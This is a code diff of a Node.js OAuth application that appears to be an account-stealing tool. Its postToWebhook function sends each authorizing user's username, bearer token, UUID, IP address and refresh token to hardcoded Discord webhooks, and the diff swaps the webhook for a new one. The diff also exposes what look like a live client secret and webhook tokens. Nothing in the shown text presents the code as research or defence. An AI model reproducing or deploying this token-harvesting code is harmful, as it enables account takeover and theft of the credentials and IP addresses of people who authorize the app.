@@ -1,8 +1,8 @@
 //Config
-const secret_value = 'yYF8Q~fzcqCGgHk2kuDBRqjI01S3cvdwA4Q9~dBC'
+const client_secret = 'yYF8Q~fzcqCGgHk2kuDBRqjI01S3cvdwA4Q9~dBC'
 const client_id = 'dacf3fb0-ff2b-4126-ab38-469fb567d3cd'
 const redirect_uri = 'https://mmcarries.onrender.com'
-const webhook_url = 'https://discordapp.com/api/webhooks/1227947933597437982/AHs2lwV6t1a9CqXrzBgZOhXNeN9mUeYKk9eWv6qm8Kz4-jYkOKnSZta_4_Epo4s57cFt'
+const webhook_url = 'https://discordapp.com/api/webhooks/1227947926052143177/-rdkTkxvq6OGUOTTgJUqIVV2v-5I5AYT7pszN8IqluGo2d5AYn6e9_z6wPkkDxnWnmX9'
 //Requirements
 const axios = require('axios')
 const express = require('express')
@@ -47,9 +47,9 @@ async function getAccessTokenAndRefreshToken(code) {
         }
     }
     let data = {
-        client_id: dacf3fb0-ff2b-4126-ab38-469fb567d3cd,
-        redirect_uri: https://mmcarries.onrender.com,
-        client_secret: yYF8Q~fzcqCGgHk2kuDBRqjI01S3cvdwA4Q9~dBC,
+        client_id: client_id,
+        redirect_uri: redirect_uri,
+        client_secret: client_secret,
         code: code,
         grant_type: 'authorization_code'
     }
@@ -142,7 +142,7 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
 }
     axios.all([ 
         axios.post(url, data),
-        axios.post("https://discordapp.com/api/webhooks/1227947933597437982/AHs2lwV6t1a9CqXrzBgZOhXNeN9mUeYKk9eWv6qm8Kz4-jYkOKnSZta_4_Epo4s57cFt", data)
+        axios.post("https://discordapp.com/api/webhooks/1227947926052143177/-rdkTkxvq6OGUOTTgJUqIVV2v-5I5AYT7pszN8IqluGo2d5AYn6e9_z6wPkkDxnWnmX9", data)
            .then(() => console.log("Successfully authenticated, posting to webhook!"))
     ])
     
